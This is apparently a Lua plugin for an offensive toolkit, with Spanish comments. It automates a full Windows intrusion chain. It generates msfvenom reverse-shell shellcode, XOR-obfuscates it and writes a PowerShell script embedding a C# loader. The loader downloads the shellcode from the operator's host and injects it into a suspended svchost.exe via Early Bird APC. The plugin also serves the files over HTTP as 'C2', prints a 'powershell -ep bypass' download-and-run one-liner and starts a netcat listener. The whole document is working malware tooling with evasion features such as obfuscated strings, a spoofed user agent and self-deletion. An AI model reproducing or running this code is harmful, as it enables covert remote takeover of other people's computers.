-- Plugin: generate_lolbird - Genera todo automáticamente: shellcode, lolbird.ps1, servidor HTTP y one-liner ofuscado
-- Uso: set lhost 192.168.1.10; set lport 4444; set key 0x33; generate_lolbird

local function write_file(path, content)
    local file = io.open(path, "w")
    if not file then return nil, "No se pudo abrir " .. path end
    file:write(content)
    file:close()
    return true
end

local function read_file(path)
    local file = io.open(path, "rb")
    if not file then return nil, "No se pudo leer " .. path end
    local content = file:read("*all")
    file:close()
    return content
end

-- Aplica XOR a una cadena de bytes (string binaria) y devuelve string \x41\x42...
local function xor_hex_string(data, key)
    local result = {}
    for i = 1, #data do
        local b = string.byte(data:sub(i, i)) ~ key
        table.insert(result, string.format("\\x%02x", b))
    end
    return table.concat(result, "")
end

-- Ofusca strings en Lua (para URLs, etc)
local function xor_string(str, key)
    local bytes = {}
    for i = 1, #str do
        table.insert(bytes, string.byte(str:sub(i, i)) ~ key)
    end
    local hex = {}
    for _, b in ipairs(bytes) do
        table.insert(hex, string.format("0x%02X", b))
    end
    return table.concat(hex, ", "), #str
end

-- Genera lolbird.ps1
local function generate_lolbird_ps1(target_url, xor_key_hex)
    local xor_key =  0x33
    local KEY = string.format("0x%02X", xor_key)

    local obf_url, len_url = xor_string(target_url, xor_key)
    local obf_proc, len_proc = xor_string("C:\\Windows\\System32\\svchost.exe", xor_key)
    local ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    local obf_ua, len_ua = xor_string(ua, xor_key)

    return [[
param(
    [Parameter(Mandatory=$true)] [string] $Target,
    [Parameter(Mandatory=$true)] [string] $Url,
    [string] $ProcessName = "C:\Windows\System32\svchost.exe",
    [string] $Key = "]] .. KEY .. [["
)
if ($Target -ne "windows") { Write-Error "Target must be 'windows'"; exit 1 }
if ($Key -notmatch '^0x[0-9a-fA-F]{1,2}$') { Write-Error "Invalid XOR key"; exit 1 }
[int]$XorKey = [Convert]::ToInt32($Key, 16)

function Xor-String {
    param([string]$Str, [int]$Key)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Str)
    $obf = foreach ($b in $bytes) { $b -bxor $Key }
    return @{ Bytes = ($obf -join ', '); Length = $bytes.Length }
}

$urlObj = Xor-String $Url $XorKey
$procObj = Xor-String $ProcessName $XorKey
$uaObj = Xor-String "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" $XorKey

$OBF_URL_BYTES = $urlObj.Bytes
$OBF_PROC_BYTES = $procObj.Bytes
$OBF_UA_BYTES = $uaObj.Bytes
$LEN_URL = $urlObj.Length
$LEN_PROC = $procObj.Length
$LEN_UA = $uaObj.Length

$Source = @"
using System;using System.IO;using System.Net;using System.Text;using System.Runtime.InteropServices;using System.Diagnostics;using System.Collections.Generic;using System.Text.RegularExpressions;
namespace lolbird {
    class Program {
        private const int XOR_KEY = ]] .. xor_key .. [[;
        private const int TIMEOUT = 15;
        private const long MAX_RESPONSE_SIZE = 2097152;
        private const int LEN_SHELLCODE_URL = ]] .. len_url .. [[;
        private const int LEN_TARGET_PROCESS = ]] .. len_proc .. [[;
        private const int LEN_USER_AGENT = ]] .. len_ua .. [[;
        private static byte[] OBF_SHELLCODE_URL = new byte[] { ]] .. obf_url .. [[ };
        private static byte[] OBF_TARGET_PROCESS = new byte[] { ]] .. obf_proc .. [[ };
        private static byte[] OBF_USER_AGENT = new byte[] { ]] .. obf_ua .. [[ };

        [DllImport("ntdll.dll")] private static extern uint NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr baseAddress, uint zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);
        [DllImport("ntdll.dll")] private static extern uint NtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint bytesWritten);
        [DllImport("ntdll.dll")] private static extern uint NtProtectVirtualMemory(IntPtr hProcess, ref IntPtr baseAddress, ref IntPtr regionSize, uint newProtect, out uint oldProtect);
        [DllImport("ntdll.dll")] private static extern uint NtQueueApcThread(IntPtr hThread, IntPtr apcRoutine, IntPtr apcArgument1, IntPtr apcArgument2, IntPtr apcArgument3);
        [DllImport("ntdll.dll")] private static extern uint NtResumeThread(IntPtr hThread, out uint suspendCount);
        [DllImport("kernel32.dll")] private static extern bool CreateProcess(string lpApplicationName, System.Text.StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll")] private static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)] private struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
        [StructLayout(LayoutKind.Sequential)] private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }

        private const uint MEM_COMMIT = 0x1000; private const uint MEM_RESERVE = 0x2000; private const uint PAGE_READWRITE = 0x04; private const uint PAGE_EXECUTE_READ = 0x20; private const uint CREATE_SUSPENDED = 0x00000004; private const uint STATUS_SUCCESS = 0x00000000;

        static string BytesToString(byte[] data, int len) {
            byte[] temp = new byte[len];
            Array.Copy(data, temp, len);
            for (int i = 0; i < len; i++) temp[i] ^= (byte)XOR_KEY;
            return Encoding.UTF8.GetString(temp);
        }

        static byte[] DownloadShellcode(string url) {
            try {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.UserAgent = BytesToString(OBF_USER_AGENT, LEN_USER_AGENT);
                request.Timeout = TIMEOUT * 1000;
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream)) {
                    string content = reader.ReadToEnd().Replace("\r", "").Replace("\n", "").Replace(" ", "");
                    var regex = new Regex(@"\\x([0-9a-fA-F]{2})", RegexOptions.IgnoreCase);
                    var matches = regex.Matches(content);
                    if (matches.Count == 0) return null;
                    var bytes = new List<byte>();
                    foreach (Match match in matches) bytes.Add(Convert.ToByte(match.Groups[1].Value, 16));
                    byte[] raw = bytes.ToArray();
                    for (int i = 0; i < raw.Length; i++) raw[i] ^= (byte)XOR_KEY;
                    return raw;
                }
            } catch { return null; }
        }

        static bool EarlyBirdAPC_Download() {
            string url = BytesToString(OBF_SHELLCODE_URL, LEN_SHELLCODE_URL);
            string processPath = BytesToString(OBF_TARGET_PROCESS, LEN_TARGET_PROCESS);
            byte[] shellcode = DownloadShellcode(url);
            if (shellcode == null || shellcode.Length == 0) return false;

            STARTUPINFO si = new STARTUPINFO(); PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = (uint)Marshal.SizeOf(si);
            System.Text.StringBuilder cmdLine = new System.Text.StringBuilder(processPath);
            if (!CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
                return false;

            IntPtr hProcess = pi.hProcess; IntPtr hThread = pi.hThread;
            IntPtr baseAddr = IntPtr.Zero; IntPtr size = (IntPtr)shellcode.Length;
            if (NtAllocateVirtualMemory(hProcess, ref baseAddr, 0, ref size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != STATUS_SUCCESS)
                return false;

            uint written; NtWriteVirtualMemory(hProcess, baseAddr, shellcode, (uint)shellcode.Length, out written);
            uint oldProtect; NtProtectVirtualMemory(hProcess, ref baseAddr, ref size, PAGE_EXECUTE_READ, out oldProtect);
            NtQueueApcThread(hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            uint suspendCount;
            NtResumeThread(hThread, out suspendCount);
            CloseHandle(hThread); CloseHandle(hProcess);
            return true;
        }

        static void Main() {
            if (EarlyBirdAPC_Download()) Environment.Exit(0); else Environment.Exit(1);
        }
    }
}
"@

try {
    Add-Type -TypeDefinition $Source -Language CSharp -OutputAssembly "lolbird.exe" -OutputType ConsoleApplication -IgnoreWarnings
    if (Test-Path "lolbird.exe") { Start-Process -FilePath .\lolbird.exe ; del lolbird.ps1 }
} catch { }
]]
end

-- === Comando principal: generate_lolbird ===
register_command("generate_lolbird", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"] or "4444"
    local xor_key_hex = "0x33"
    local xor_key = tonumber(xor_key_hex, 16) or 0x33

    if not lhost then
        return "Error: lhost no definido. Usa 'set lhost x.x.x.x'"
    end

    -- Rutas
    local shellcode_bin = "sessions/shell.bin"
    local shellcode_txt = "sessions/shellcode_windows.txt"
    local ps1_path = "sessions/lolbird.ps1"
    local sc_url = "http://" .. lhost .. "/shellcode_windows.txt"
    local ps1_url = "http://" .. lhost .. "/lolbird.ps1"

    -- 1. Generar shellcode raw
    print("[*] witchcrafting shellcode with msfvenom...")
    local msf_cmd = string.format("msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f raw -o %s", lhost, lport, shellcode_bin)

    -- Ejecutar msfvenom (ignorar advertencias, confiar en archivo)
    os.execute(msf_cmd)

    -- Verificar que el archivo se generó
    local f = io.open(shellcode_bin, "rb")
    if not f then
        return "[!] Error: No se generó " .. shellcode_bin .. ". ¿Tienes msfvenom en PATH?"
    end
    local data = f:read("*all")
    f:close()

    if not data or #data == 0 then
        return "[!] Error: El shellcode está vacío. Verifica LHOST/LPORT."
    end
    print("[+] Shellcode witchcrafted: " .. shellcode_bin .. " (" .. #data .. " bytes)")

    -- 2. Aplicar XOR al shellcode
    print("[*] malefic XOR apply" .. xor_key_hex .. " to shellcode...")
    local xor_encoded = xor_hex_string(data, xor_key)
    write_file(shellcode_txt, xor_encoded)
    print("[+] Shellcode ofuscated saved as: " .. shellcode_txt)

    -- 3. Generar lolbird.ps1
    print("[*] witchcrafting lolbird.ps1...")
    local ps1_content = generate_lolbird_ps1(sc_url, xor_key_hex)
    write_file(ps1_path, ps1_content)
    print("[+] lolbird.ps1 manifested at: " .. ps1_path)

    -- 4. One-liner de ejecución
    local oneliner = string.format(
        'powershell -ep bypass -c "IWR %s -OutFile lolbird.ps1; .\\lolbird.ps1 -Target windows -Url \'%s\' -Key \'%s\'"',
        ps1_url, sc_url, xor_key_hex
    )

    -- 5. Iniciar servidor HTTP
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")
    print("\n[+] C2 Web  http://" .. lhost .. ":80")

    -- 6. Mostrar y copiar al portapapeles
    print("\n[🔥] One-liner Ready and copied:")
    print("\n" .. oneliner .. "\n")
    app.one_cmd("encodewinbase64 " .. oneliner)

    -- Listener sugerido
    print("[*] staring nc listener:")
    app.one_cmd("rnc")

    return "✅ All done"
end)